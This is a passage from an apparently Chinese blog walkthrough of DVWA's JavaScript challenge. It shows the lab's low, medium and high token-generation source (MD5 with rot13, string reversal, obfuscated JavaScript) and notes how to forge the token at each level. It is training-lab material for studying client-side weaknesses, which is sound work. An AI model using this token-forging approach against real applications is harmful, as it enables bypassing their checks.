class=na>8</span><span class=err>],</span><span class=na>11</span><span class=err>,-</span><span class=na>2022574463</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>11</span><span class=err>],</span><span class=na>16</span><span class=err>,</span><span class=na>1839030562</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>14</span><span class=err>],</span><span class=na>23</span><span class=err>,-</span><span class=na>35309556</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>1</span><span class=err>],</span><span class=na>4</span><span class=err>,-</span><span class=na>1530992060</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>4</span><span class=err>],</span><span class=na>11</span><span class=err>,</span><span class=na>1272893353</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>7</span><span class=err>],</span><span class=na>16</span><span class=err>,-</span><span class=na>155497632</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>10</span><span class=err>],</span><span class=na>23</span><span class=err>,-</span><span class=na>1094730640</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>13</span><span class=err>],</span><span class=na>4</span><span class=err>,</span><span class=na>681279174</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>],</span><span class=na>11</span><span class=err>,-</span><span class=na>358537222</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>3</span><span class=err>],</span><span class=na>16</span><span class=err>,-</span><span class=na>722521979</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>6</span><span class=err>],</span><span class=na>23</span><span class=err>,</span><span class=na>76029189</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>9</span><span class=err>],</span><span class=na>4</span><span class=err>,-</span><span class=na>640364487</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>12</span><span class=err>],</span><span class=na>11</span><span class=err>,-</span><span class=na>421815835</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>15</span><span class=err>],</span><span class=na>16</span><span class=err>,</span><span class=na>530742520</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>2</span><span class=err>],</span><span class=na>23</span><span class=err>,-</span><span class=na>995338651</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>],</span><span class=na>6</span><span class=err>,-</span><span class=na>198630844</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>7</span><span class=err>],</span><span class=na>10</span><span class=err>,</span><span class=na>1126891415</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>14</span><span class=err>],</span><span class=na>15</span><span class=err>,-</span><span class=na>1416354905</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>5</span><span class=err>],</span><span class=na>21</span><span class=err>,-</span><span class=na>57434055</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>12</span><span class=err>],</span><span class=na>6</span><span class=err>,</span><span class=na>1700485571</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>3</span><span class=err>],</span><span class=na>10</span><span class=err>,-</span><span class=na>1894986606</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>10</span><span class=err>],</span><span class=na>15</span><span class=err>,-</span><span class=na>1051523</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>1</span><span class=err>],</span><span class=na>21</span><span class=err>,-</span><span class=na>2054922799</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>8</span><span class=err>],</span><span class=na>6</span><span class=err>,</span><span class=na>1873313359</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>15</span><span class=err>],</span><span class=na>10</span><span class=err>,-</span><span class=na>30611744</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>6</span><span class=err>],</span><span class=na>15</span><span class=err>,-</span><span class=na>1560198380</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>13</span><span class=err>],</span><span class=na>21</span><span class=err>,</span><span class=na>1309151649</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>4</span><span class=err>],</span><span class=na>6</span><span class=err>,-</span><span class=na>145523070</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>11</span><span class=err>],</span><span class=na>10</span><span class=err>,-</span><span class=na>1120210379</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>2</span><span class=err>],</span><span class=na>15</span><span class=err>,</span><span class=na>718787259</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>9</span><span class=err>],</span><span class=na>21</span><span class=err>,-</span><span class=na>343485551</span><span class=err>),</span><span class=na>l</span><span class=o>=</span><span class=na>t</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>i</span><span class=err>),</span><span class=na>g</span><span class=o>=</span><span class=na>t</span><span class=err>(</span><span class=na>g</span><span class=err>,</span><span class=na>a</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>t</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>d</span><span class=err>),</span><span class=na>m</span><span class=o>=</span><span class=na>t</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>h</span><span class=err>);</span><span class=na>return</span><span class=err>[</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>]</span><span class=p>}</span><span class=na>function</span> <span class=na>a</span><span class=err>(</span><span class=na>n</span><span class=err>)</span><span class=p>{</span><span class=na>var</span> <span class=na>t</span><span class=err>,</span><span class=na>r</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=err>,</span><span class=na>e</span><span class=o>=</span><span class=na>32</span><span class=err>*</span><span class=na>n.length</span><span class=err>;</span><span class=na>for</span><span class=err>(</span><span class=na>t</span><span class=o>=</span><span class=na>0</span><span class=err>;</span><span class=na>t</span><span class=err>&lt;</span><span class=na>e</span><span class=err>;</span><span class=na>t</span><span class=err>+=</span><span class=na>8</span><span class=err>)</span><span class=na>r</span><span class=err>+=</span><span class=na>String.fromCharCode</span><span class=err>(</span><span class=na>n</span><span class=err>[</span><span class=na>t</span><span class=p>&gt;</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>]</span><span class=o>&gt;&gt;&gt;</span><span class=nx>t</span><span class=o>%</span><span class=mi>32</span><span class=o>&amp;</span><span class=mi>255</span><span class=p>);</span><span class=k>return</span> <span class=nx>r</span><span class=p>}</span><span class=kd>function</span> <span class=nx>d</span><span class=p>(</span><span class=nx>n</span><span class=p>){</span><span class=kd>var</span> <span class=nx>t</span><span class=p>,</span><span class=nx>r</span><span class=o>=</span><span class=p>[];</span><span class=k>for</span><span class=p>(</span><span class=nx>r</span><span class=p>[(</span><span class=nx>n</span><span class=p>.</span><span class=nx>length</span><span class=o>&gt;&gt;</span><span class=mi>2</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>=</span><span class=k>void</span> <span class=mi>0</span><span class=p>,</span><span class=nx>t</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>t</span><span class=p>&lt;</span><span class=nt>r.length</span><span class=err>;</span><span class=na>t</span><span class=err>+=</span><span class=na>1</span><span class=err>)</span><span class=na>r</span><span class=err>[</span><span class=na>t</span><span class=err>]=</span><span class=na>0</span><span class=err>;</span><span class=na>var</span> <span class=na>e</span><span class=o>=</span><span class=na>8</span><span class=err>*</span><span class=na>n.length</span><span class=err>;</span><span class=na>for</span><span class=err>(</span><span class=na>t</span><span class=o>=</span><span class=na>0</span><span class=err>;</span><span class=na>t</span><span class=err>&lt;</span><span class=na>e</span><span class=err>;</span><span class=na>t</span><span class=err>+=</span><span class=na>8</span><span class=err>)</span><span class=na>r</span><span class=err>[</span><span class=na>t</span><span class=p>&gt;</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>]</span><span class=o>|=</span><span class=p>(</span><span class=mi>255</span><span class=o>&amp;</span><span class=nx>n</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>t</span><span class=o>/</span><span class=mi>8</span><span class=p>))</span><span class=o>&lt;&lt;</span><span class=nx>t</span><span class=o>%</span><span class=mi>32</span><span class=p>;</span><span class=k>return</span> <span class=nx>r</span><span class=p>}</span><span class=kd>function</span> <span class=nx>h</span><span class=p>(</span><span class=nx>n</span><span class=p>){</span><span class=k>return</span> <span class=nx>a</span><span class=p>(</span><span class=nx>i</span><span class=p>(</span><span class=nx>d</span><span class=p>(</span><span class=nx>n</span><span class=p>),</span><span class=mi>8</span><span class=o>*</span><span class=nx>n</span><span class=p>.</span><span class=nx>length</span><span class=p>))}</span><span class=kd>function</span> <span class=nx>l</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>){</span><span class=kd>var</span> <span class=nx>r</span><span class=p>,</span><span class=nx>e</span><span class=p>,</span><span class=nx>o</span><span class=o>=</span><span class=nx>d</span><span class=p>(</span><span class=nx>n</span><span class=p>),</span><span class=nx>u</span><span class=o>=</span><span class=p>[],</span><span class=nx>c</span><span class=o>=</span><span class=p>[];</span><span class=k>for</span><span class=p>(</span><span class=nx>u</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span><span class=o>=</span><span class=nx>c</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span><span class=o>=</span><span class=k>void</span> <span class=mi>0</span><span class=p>,</span><span class=nx>o</span><span class=p>.</span><span class=nx>length</span><span class=o>&gt;</span><span class=mi>16</span><span class=o>&amp;&amp;</span><span class=p>(</span><span class=nx>o</span><span class=o>=</span><span class=nx>i</span><span class=p>(</span><span class=nx>o</span><span class=p>,</span><span class=mi>8</span><span class=o>*</span><span class=nx>n</span><span class=p>.</span><span class=nx>length</span><span class=p>)),</span><span class=nx>r</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>r</span><span class=p>&lt;</span><span class=nt>16</span><span class=err>;</span><span class=na>r</span><span class=err>+=</span><span class=na>1</span><span class=err>)</span><span class=na>u</span><span class=err>[</span><span class=na>r</span><span class=err>]=</span><span class=na>909522486</span><span class=err>^</span><span class=na>o</span><span class=err>[</span><span class=na>r</span><span class=err>],</span><span class=na>c</span><span class=err>[</span><span class=na>r</span><span class=err>]=</span><span class=na>1549556828</span><span class=err>^</span><span class=na>o</span><span class=err>[</span><span class=na>r</span><span class=err>];</span><span class=na>return</span> <span class=na>e</span><span class=o>=</span><span class=na>i</span><span class=err>(</span><span class=na>u.concat</span><span class=err>(</span><span class=na>d</span><span class=err>(</span><span class=na>t</span><span class=err>)),</span><span class=na>512</span><span class=err>+</span><span class=na>8</span><span class=err>*</span><span class=na>t.length</span><span class=err>),</span><span class=na>a</span><span class=err>(</span><span class=na>i</span><span class=err>(</span><span class=na>c.concat</span><span class=err>(</span><span class=na>e</span><span class=err>),</span><span class=na>640</span><span class=err>))</span><span class=p>}</span><span class=na>function</span> <span class=na>g</span><span class=err>(</span><span class=na>n</span><span class=err>)</span><span class=p>{</span><span class=na>var</span> <span class=na>t</span><span class=err>,</span><span class=na>r</span><span class=err>,</span><span class=na>e</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=err>;</span><span class=na>for</span><span class=err>(</span><span class=na>r</span><span class=o>=</span><span class=na>0</span><span class=err>;</span><span class=na>r</span><span class=err>&lt;</span><span class=na>n.length</span><span class=err>;</span><span class=na>r</span><span class=err>+=</span><span class=na>1</span><span class=err>)</span><span class=na>t</span><span class=o>=</span><span class=na>n.charCodeAt</span><span class=err>(</span><span class=na>r</span><span class=err>),</span><span class=na>e</span><span class=err>+=&#34;</span><span class=na>0123456789abcdef</span><span class=err>&#34;</span><span class=na>.charAt</span><span class=err>(</span><span class=na>t</span><span class=p>&gt;</span><span class=o>&gt;&gt;</span><span class=mi>4</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;0123456789abcdef&#34;</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=mi>15</span><span class=o>&amp;</span><span class=nx>t</span><span class=p>);</span><span class=k>return</span> <span class=nx>e</span><span class=p>}</span><span class=kd>function</span> <span class=nx>v</span><span class=p>(</span><span class=nx>n</span><span class=p>){</span><span class=k>return</span> <span class=nx>unescape</span><span class=p>(</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>n</span><span class=p>))}</span><span class=kd>function</span> <span class=nx>m</span><span class=p>(</span><span class=nx>n</span><span class=p>){</span><span class=k>return</span> <span class=nx>h</span><span class=p>(</span><span class=nx>v</span><span class=p>(</span><span class=nx>n</span><span class=p>))}</span><span class=kd>function</span> <span class=nx>p</span><span class=p>(</span><span class=nx>n</span><span class=p>){</span><span class=k>return</span> <span class=nx>g</span><span class=p>(</span><span class=nx>m</span><span class=p>(</span><span class=nx>n</span><span class=p>))}</span><span class=kd>function</span> <span class=nx>s</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>){</span><span class=k>return</span> <span class=nx>l</span><span class=p>(</span><span class=nx>v</span><span class=p>(</span><span class=nx>n</span><span class=p>),</span><span class=nx>v</span><span class=p>(</span><span class=nx>t</span><span class=p>))}</span><span class=kd>function</span> <span class=nx>C</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>){</span><span class=k>return</span> <span class=nx>g</span><span class=p>(</span><span class=nx>s</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>))}</span><span class=kd>function</span> <span class=nx>A</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>r</span><span class=p>){</span><span class=k>return</span> <span class=nx>t</span><span class=o>?</span><span class=nx>r</span><span class=o>?</span><span class=nx>s</span><span class=p>(</span><span class=nx>t</span><span class=p>,</span><span class=nx>n</span><span class=p>)</span><span class=o>:</span><span class=nx>C</span><span class=p>(</span><span class=nx>t</span><span class=p>,</span><span class=nx>n</span><span class=p>)</span><span class=o>:</span><span class=nx>r</span><span class=o>?</span><span class=nx>m</span><span class=p>(</span><span class=nx>n</span><span class=p>)</span><span class=o>:</span><span class=nx>p</span><span class=p>(</span><span class=nx>n</span><span class=p>)}</span><span class=s2>&#34;function&#34;</span><span class=o>==</span><span class=k>typeof</span> <span class=nx>define</span><span class=o>&amp;&amp;</span><span class=nx>define</span><span class=p>.</span><span class=nx>amd</span><span class=o>?</span><span class=nx>define</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span><span class=k>return</span> <span class=nx>A</span><span class=p>})</span><span class=o>:</span><span class=s2>&#34;object&#34;</span><span class=o>==</span><span class=k>typeof</span> <span class=nx>module</span><span class=o>&amp;&amp;</span><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span><span class=o>?</span><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span><span class=o>=</span><span class=nx>A</span><span class=o>:</span><span class=nx>n</span><span class=p>.</span><span class=nx>md5</span><span class=o>=</span><span class=nx>A</span><span class=p>}(</span><span class=k>this</span><span class=p>);</span>  
  
    <span class=kd>function</span> <span class=nx>rot13</span><span class=p>(</span><span class=nx>inp</span><span class=p>)</span> <span class=p>{</span>  
        <span class=k>return</span> <span class=nx>inp</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[a-zA-Z]/g</span><span class=p>,</span><span class=kd>function</span><span class=p>(</span><span class=nx>c</span><span class=p>){</span><span class=k>return</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>((</span><span class=nx>c</span><span class=o>&lt;=</span><span class=s2>&#34;Z&#34;</span><span class=o>?</span><span class=mi>90</span><span class=o>:</span><span class=mi>122</span><span class=p>)</span><span class=o>&gt;=</span><span class=p>(</span><span class=nx>c</span><span class=o>=</span><span class=nx>c</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=mi>13</span><span class=p>)</span><span class=o>?</span><span class=nx>c</span><span class=o>:</span><span class=nx>c</span><span class=o>-</span><span class=mi>26</span><span class=p>);});</span>  
    <span class=p>}</span>  
  
    <span class=kd>function</span> <span class=nx>generate_token</span><span class=p>()</span> <span class=p>{</span>  
        <span class=kd>var</span> <span class=nx>phrase</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;phrase&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>  
        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rot13</span><span class=p>(</span><span class=nx>phrase</span><span class=p>));</span>  
    <span class=p>}</span>  
  
    <span class=nx>generate_token</span><span class=p>();</span>  
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>  
<span class=nx>EOF</span><span class=p>;</span>  
<span class=o>?&gt;</span>  
</code></pre></td></tr></table></div></div><p>输入success带token:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/24.png data-srcset="/images/dvwa/24.png, /images/dvwa/24.png 1.5x, /images/dvwa/24.png 2x" data-sizes=auto alt=/images/dvwa/24.png title=/images/dvwa/24.png></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/25.png data-srcset="/images/dvwa/25.png, /images/dvwa/25.png 1.5x, /images/dvwa/25.png 2x" data-sizes=auto alt=/images/dvwa/25.png title=/images/dvwa/25.png></p><h3 id=medium-10>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
<span class=nv>$page</span><span class=p>[</span> <span class=s1>&#39;body&#39;</span> <span class=p>]</span> <span class=o>.=</span> <span class=o>&lt;&lt;&lt;</span><span class=nx>EOF</span>  
<span class=o>&lt;</span><span class=nx>script</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;/vulnerabilities/javascript/source/medium.js&#34;</span><span class=o>&gt;&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>  
<span class=nx>EOF</span><span class=p>;</span>  
<span class=cp>?&gt;</span><span class=err>  
</span><span class=err>function do_something(e){  
</span><span class=err>	for(var t=&#34;&#34;,n=e.length-1;n&gt;=0;n--)  
</span><span class=err>			t+=e[n];  
</span><span class=err>	return t  
</span><span class=err>}  
</span><span class=err>setTimeout(function(){do_elsesomething(&#34;XX&#34;)},300);  
</span><span class=err>function do_elsesomething(e)  
</span><span class=err>{  
</span><span class=err>	document.getElementById(&#34;token&#34;).value=do_something(e+document.getElementById(&#34;phrase&#34;).value+&#34;XX&#34;)  
</span><span class=err>}  
</span></code></pre></td></tr></table></div></div><p>将phrase变量的值逆序，也就是sseccus;生成的token值<code>XXsseccusXX</code></p><h3 id=high-10>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-jsx data-lang=jsx><span class=kd>var</span> <span class=nx>a</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;fromCharCode&#39;</span><span class=p>,</span><span class=s1>&#39;toString&#39;</span><span class=p>,</span><span class=s1>&#39;replace&#39;</span><span class=p>,</span><span class=s1>&#39;BeJ&#39;</span><span class=p>,</span><span class=s1>&#39;\\x5cw+&#39;</span><span class=p>,</span><span class=s1>&#39;Lyg&#39;</span><span class=p>,</span><span class=s1>&#39;SuR&#39;</span><span class=p>,</span><span class=s1>&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t